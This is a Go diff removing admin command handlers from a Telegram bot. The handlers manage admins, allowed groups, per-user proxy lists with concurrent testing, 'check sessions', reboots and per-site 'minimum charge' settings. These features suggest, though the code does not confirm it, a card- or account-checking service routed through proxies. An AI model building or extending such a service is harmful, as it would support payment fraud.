-			if e.Expiry == 0 {
-				sb.WriteString(fmt.Sprintf("%d. %d — ♾ permanent\n", i+1, e.ID))
-			} else {
-				expTime := time.Unix(e.Expiry, 0)
-				if time.Now().After(expTime) {
-					sb.WriteString(fmt.Sprintf("%d. %d — ⏰ EXPIRED\n", i+1, e.ID))
-				} else {
-					remaining := time.Until(expTime).Truncate(time.Minute)
-					sb.WriteString(fmt.Sprintf("%d. %d — ⏳ %s left\n", i+1, e.ID, remaining))
-				}
-			}
-		}
-		return c.Send(sb.String())
-	})
-
-	// ── /admins — show all admin IDs ──
-	bot.Handle("/admins", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		var ids []int64
-		for id := range adminIDs {
-			ids = append(ids, id)
-		}
-		sort.Slice(ids, func(i, j int) bool { return ids[i] < ids[j] })
-		var sb strings.Builder
-		sb.WriteString(fmt.Sprintf("👑 Admins (%d):\n\n", len(ids)))
-		for i, id := range ids {
-			tag := ""
-			if originalAdminIDs[id] {
-				tag = " (owner)"
-			}
-			sb.WriteString(fmt.Sprintf("%d. %d%s\n", i+1, id, tag))
-		}
-		return c.Send(sb.String())
-	})
-
-	// ── /addadmin ──
-	bot.Handle("/addadmin", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		raw := strings.TrimSpace(c.Message().Payload)
-		if raw == "" {
-			return c.Send("Usage: /addadmin <user_id>")
-		}
-		uid, err := strconv.ParseInt(raw, 10, 64)
-		if err != nil {
-			return c.Send("❌ Invalid user ID")
-		}
-		if adminIDs[uid] {
-			return c.Send("⚠️ Already an admin.")
-		}
-		adminIDs[uid] = true
-		cfg.mu.Lock()
-		cfg.DynamicAdmins[uid] = true
-		cfg.mu.Unlock()
-		cfg.Save()
-		return c.Send(fmt.Sprintf("✅ User %d is now an admin.", uid))
-	})
-
-	// ── /rmadmin ──
-	bot.Handle("/rmadmin", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		raw := strings.TrimSpace(c.Message().Payload)
-		if raw == "" {
-			return c.Send("Usage: /rmadmin <user_id>")
-		}
-		uid, err := strconv.ParseInt(raw, 10, 64)
-		if err != nil {
-			return c.Send("❌ Invalid user ID")
-		}
-		if originalAdminIDs[uid] {
-			return c.Send("❌ Cannot remove an owner admin.")
-		}
-		if !adminIDs[uid] {
-			return c.Send("⚠️ User is not an admin.")
-		}
-		delete(adminIDs, uid)
-		cfg.mu.Lock()
-		delete(cfg.DynamicAdmins, uid)
-		cfg.mu.Unlock()
-		cfg.Save()
-		return c.Send(fmt.Sprintf("✅ User %d removed from admins.", uid))
-	})
-
-	// ── /giveperm <user_id> <command> ──
-	bot.Handle("/giveperm", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		parts := strings.Fields(c.Message().Payload)
-		if len(parts) < 2 {
-			return c.Send("Usage: /giveperm <user_id> <command>")
-		}
-		uid, err := strconv.ParseInt(parts[0], 10, 64)
-		if err != nil {
-			return c.Send("❌ Invalid user ID")
-		}
-		cmd := strings.TrimPrefix(parts[1], "/")
-		cfg.mu.Lock()
-		if cfg.UserPerms[uid] == nil {
-			cfg.UserPerms[uid] = make(map[string]bool)
-		}
-		cfg.UserPerms[uid][cmd] = true
-		cfg.mu.Unlock()
-		cfg.Save()
-		return c.Send(fmt.Sprintf("✅ User %d granted /%s permission.", uid, cmd))
-	})
-
-	// ── /addgp <group_id>[, ...] ──
-	bot.Handle("/addgp", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		raw := strings.TrimSpace(c.Message().Payload)
-		if raw == "" {
-			return c.Send("Usage: /addgp <group_id>[, ...]")
-		}
-		ids := parseIDList(raw)
-		if len(ids) == 0 {
-			return c.Send("❌ No valid group IDs provided")
-		}
-		cfg.mu.Lock()
-		for _, id := range ids {
-			cfg.AllowedGroups[id] = true
-		}
-		total := len(cfg.AllowedGroups)
-		cfg.mu.Unlock()
-		cfg.Save()
-		return c.Send(fmt.Sprintf("✅ Added %d group(s). Total: %d", len(ids), total))
-	})
-
-	// ── /showgp — show allowed groups ──
-	bot.Handle("/showgp", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		cfg.mu.RLock()
-		groupsOnly := cfg.GroupsOnly
-		groups := make([]int64, 0, len(cfg.AllowedGroups))
-		for id := range cfg.AllowedGroups {
-			groups = append(groups, id)
-		}
-		cfg.mu.RUnlock()
-
-		mode := "OFF"
-		if groupsOnly {
-			mode = "ON"
-		}
-		var sb strings.Builder
-		sb.WriteString(fmt.Sprintf("🏷 Groups-only mode: %s\n\n", mode))
-		if len(groups) == 0 {
-			sb.WriteString("📝 No groups configured.")
-		} else {
-			sort.Slice(groups, func(i, j int) bool { return groups[i] < groups[j] })
-			sb.WriteString(fmt.Sprintf("Allowed groups (%d):\n", len(groups)))
-			for i, id := range groups {
-				sb.WriteString(fmt.Sprintf("%d. %d\n", i+1, id))
-			}
-		}
-		return c.Send(sb.String())
-	})
-
-	// ── /delgp <group_id>[, ...] ──
-	bot.Handle("/delgp", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		raw := strings.TrimSpace(c.Message().Payload)
-		if raw == "" {
-			return c.Send("Usage: /delgp <group_id>[, ...]")
-		}
-		ids := parseIDList(raw)
-		if len(ids) == 0 {
-			return c.Send("❌ No valid group IDs provided")
-		}
-		cfg.mu.Lock()
-		for _, id := range ids {
-			delete(cfg.AllowedGroups, id)
-		}
-		cfg.mu.Unlock()
-		cfg.Save()
-		return c.Send(fmt.Sprintf("✅ Removed %d group(s).", len(ids)))
-	})
-
-	// ── /onlygp — enable groups-only mode ──
-	bot.Handle("/onlygp", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		cfg.mu.Lock()
-		cfg.GroupsOnly = true
-		cfg.mu.Unlock()
-		cfg.Save()
-		return c.Send("🔒 Groups-only mode enabled. Bot will only work in allowed groups.\nUse /addgp to add groups, /allowuser to whitelist PM users.")
-	})
-
-	// ── /allowall — disable groups-only mode ──
-	bot.Handle("/allowall", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		cfg.mu.Lock()
-		cfg.GroupsOnly = false
-		cfg.mu.Unlock()
-		cfg.Save()
-		return c.Send("🔓 Groups-only mode disabled. Bot works everywhere.")
-	})
-
-	// ── /show <user_id> — admin show user proxies ──
-	bot.Handle("/show", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		raw := strings.TrimSpace(c.Message().Payload)
-		if raw == "" {
-			return c.Send("Usage: /show <user_id>")
-		}
-		uid, err := strconv.ParseInt(raw, 10, 64)
-		if err != nil {
-			return c.Send("❌ Invalid user ID")
-		}
-		ud := um.Get(uid)
-		if len(ud.Proxies) == 0 {
-			return c.Send(fmt.Sprintf("📝 User %d has no proxies.", uid))
-		}
-		var sb strings.Builder
-		sb.WriteString(fmt.Sprintf("🌐 Proxies for user %d (%d):\n\n", uid, len(ud.Proxies)))
-		for i, p := range ud.Proxies {
-			sb.WriteString(fmt.Sprintf("%d. %s\n", i+1, p))
-		}
-		return c.Send(sb.String())
-	})
-
-	// ── /chkpr <user_id> — admin check user proxies ──
-	bot.Handle("/chkpr", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		raw := strings.TrimSpace(c.Message().Payload)
-		if raw == "" {
-			return c.Send("Usage: /chkpr <user_id>")
-		}
-		uid, err := strconv.ParseInt(raw, 10, 64)
-		if err != nil {
-			return c.Send("❌ Invalid user ID")
-		}
-		ud := um.Get(uid)
-		if len(ud.Proxies) == 0 {
-			return c.Send(fmt.Sprintf("📝 User %d has no proxies.", uid))
-		}
-		c.Send(fmt.Sprintf("🔄 Testing %d proxy(s) for user %d...", len(ud.Proxies), uid))
-
-		type proxyResult struct {
-			idx     int
-			proxy   string
-			working bool
-		}
-		resultsCh := make(chan proxyResult, len(ud.Proxies))
-		var wg sync.WaitGroup
-		for i, p := range ud.Proxies {
-			wg.Add(1)
-			go func(idx int, proxy string) {
-				defer wg.Done()
-				resultsCh <- proxyResult{idx: idx, proxy: proxy, working: testProxy(proxy) == nil}
-			}(i, p)
-		}
-		wg.Wait()
-		close(resultsCh)
-
-		working := 0
-		failed := 0
-		var failedList []string
-		for r := range resultsCh {
-			if r.working {
-				working++
-			} else {
-				failed++
-				failedList = append(failedList, fmt.Sprintf("%d. %s", r.idx+1, r.proxy))
-			}
-		}
-		resultMsg := fmt.Sprintf("✅ Working: %d\n❌ Failed: %d", working, failed)
-		if len(failedList) > 0 {
-			resultMsg += "\n\nFailed proxies:\n" + strings.Join(failedList, "\n")
-		}
-		return c.Send(resultMsg)
-	})
-
-	// ── /cleanproxies — clean all invalid proxies from all users ──
-	bot.Handle("/cleanproxies", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		c.Send("🔄 Cleaning invalid proxies from all users... This may take a while.")
-
-		// Collect all user proxies outside the lock
-		type userProxies struct {
-			uid     int64
-			proxies []string
-		}
-		um.mu.RLock()
-		var allUsers []userProxies
-		for uid, ud := range um.users {
-			if len(ud.Proxies) > 0 {
-				cp := make([]string, len(ud.Proxies))
-				copy(cp, ud.Proxies)
-				allUsers = append(allUsers, userProxies{uid: uid, proxies: cp})
-			}
-		}
-		um.mu.RUnlock()
-
-		totalRemoved := 0
-		usersAffected := 0
-
-		for _, up := range allUsers {
-			// Test all proxies for this user concurrently
-			results := make([]bool, len(up.proxies))
-			var wg sync.WaitGroup
-			for i, p := range up.proxies {
-				wg.Add(1)
-				go func(idx int, proxy string) {
-					defer wg.Done()
-					results[idx] = testProxy(proxy) == nil
-				}(i, p)
-			}
-			wg.Wait()
-
-			var valid []string
-			removed := 0
-			for i, ok := range results {
-				if ok {
-					valid = append(valid, up.proxies[i])
-				} else {
-					removed++
-				}
-			}
-			if removed > 0 {
-				ud := um.Get(up.uid)
-				ud.Proxies = valid
-				totalRemoved += removed
-				usersAffected++
-				fmt.Printf("[CLEANPROXIES] Removed %d dead proxies from user %d\n", removed, up.uid)
-			}
-		}
-		um.Save()
-
-		return c.Send(fmt.Sprintf("✅ Cleanup complete\n🗑 Removed: %d proxies\n👥 Users affected: %d", totalRemoved, usersAffected))
-	})
-
-	// ── /stopuser <user_id> ──
-	bot.Handle("/stopuser", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		raw := strings.TrimSpace(c.Message().Payload)
-		if raw == "" {
-			return c.Send("Usage: /stopuser <user_id>")
-		}
-		uid, err := strconv.ParseInt(raw, 10, 64)
-		if err != nil {
-			return c.Send("❌ Invalid user ID")
-		}
-		val, ok := activeSessions.Load(uid)
-		if !ok {
-			return c.Send(fmt.Sprintf("⚠️ No active session for user %d", uid))
-		}
-		sess := val.(*CheckSession)
-		sess.Cancel()
-		return c.Send(fmt.Sprintf("✅ Stopped session for user %d (@%s)", uid, sess.Username))
-	})
-
-	// ── /resetactive — reset all active checks ──
-	bot.Handle("/resetactive", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		count := 0
-		activeSessions.Range(func(key, val any) bool {
-			sess := val.(*CheckSession)
-			sess.Cancel()
-			activeSessions.Delete(key)
-			count++
-			return true
-		})
-		if count == 0 {
-			return c.Send("⚠️ No active sessions.")
-		}
-		return c.Send(fmt.Sprintf("✅ Reset %d active session(s).", count))
-	})
-
-	// ── /reboot — reboot the bot ──
-	bot.Handle("/reboot", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		c.Send("🔄 Rebooting bot... Sessions will be lost.")
-		um.Save()
-		cfg.Save()
-		saveCustomSites()
-
-		exe, err := os.Executable()
-		if err != nil {
-			return c.Send("❌ Failed to find executable: " + err.Error())
-		}
-		syscall.Exec(exe, os.Args, os.Environ())
-		return nil
-	})
-
-	// ── /setprice <site_url> <amount> — set minimum charge for a site ──
-	bot.Handle("/setprice", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		parts := strings.Fields(c.Message().Payload)
-		if len(parts) < 2 {
-			return c.Send("Usage: /setprice <site_url> <amount>")
-		}
-		site := strings.TrimRight(parts[0], "/")
-		if !strings.HasPrefix(site, "http") {
-			site = "https://" + site
-		}
-		amount, err := strconv.ParseFloat(parts[1], 64)
-		if err != nil {
-			return c.Send("❌ Invalid amount")
-		}
-		cfg.mu.Lock()
-		cfg.SitePrices[site] = amount
-		cfg.mu.Unlock()
-		cfg.Save()
-		return c.Send(fmt.Sprintf("✅ Set minimum charge for %s: $%.2f", site, amount))
 	})
 
 	fwd.BindRCtx(bot)
